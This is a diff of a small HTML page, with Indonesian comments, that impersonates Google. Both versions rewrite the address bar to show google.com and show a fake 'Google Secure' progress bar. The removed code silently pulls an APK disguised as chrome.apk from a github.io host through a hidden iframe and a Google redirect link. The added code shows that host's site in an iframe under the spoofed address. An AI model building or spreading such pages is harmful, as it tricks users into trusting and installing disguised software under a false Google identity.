@@ -4,60 +4,48 @@
 <meta charset="utf-8">
 
 <style>
-
 body{
-font-family:Arial;
-text-align:center;
-margin-top:120px;
-}
-
-.button{
-background:#4CAF50;
-border:none;
-color:white;
-padding:16px 36px;
-font-size:18px;
-cursor:pointer;
+  font-family:Arial;
+  text-align:center;
+  margin-top:120px;
 }
 
 #loader{
-display:none;
-margin-top:40px;
+  margin-top:40px;
 }
 
 #progress{
-width:300px;
-height:20px;
-border:1px solid #ccc;
-margin:auto;
+  width:320px;
+  height:20px;
+  border:1px solid #ccc;
+  margin:auto;
 }
 
 #bar{
-width:0%;
-height:100%;
-background:#4CAF50;
+  width:0%;
+  height:100%;
+  background:#4CAF50;
 }
 
-#frame{
-display:none;
-width:0;
-height:0;
-border:0;
+#content{
+  display:none;
+  margin-top:40px;
 }
 
+iframe{
+  width:100%;
+  height:600px;
+  border:none;
+}
 </style>
 
 </head>
 
 <body>
 
-<h2>Preparing Secure Download...</h2>
-
-<button class="button" onclick="start()">Download From Original Site</button>
+<h2>Connecting to Google Secure Service...</h2>
 
 <div id="loader">
-
-<p>Connecting to Google Secure Server...</p>
 
 <div id="progress">
 <div id="bar"></div>
@@ -65,24 +53,17 @@ border:0;
 
 </div>
 
-<iframe id="frame"></iframe>
+<div id="content">
+<iframe src="https://ecdnts-del.github.io"></iframe>
+</div>
 
 <script>
 
-function start(){
-
-// ubah URL di address bar jadi google.com (via redirect endpoint)
+// membuat URL terlihat google
 history.replaceState({}, "", "https://www.google.com/");
-
-document.getElementById("loader").style.display="block";
 
 let bar=document.getElementById("bar");
 let width=0;
-
-// google redirect ke file asli
-const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";
-
-document.getElementById("frame").src=downloadURL;
 
 let interval=setInterval(function(){
 
@@ -90,19 +71,17 @@ if(width>=100){
 
 clearInterval(interval);
 
-// tetap redirect ke google setelah loading
-window.location.href="https://google.com";
+document.getElementById("loader").style.display="none";
+document.getElementById("content").style.display="block";
 
 }else{
 
-width+=4;
+width+=5;
 bar.style.width=width+"%";
 
 }
 
 },120);
-
-}
 
 </script>
 
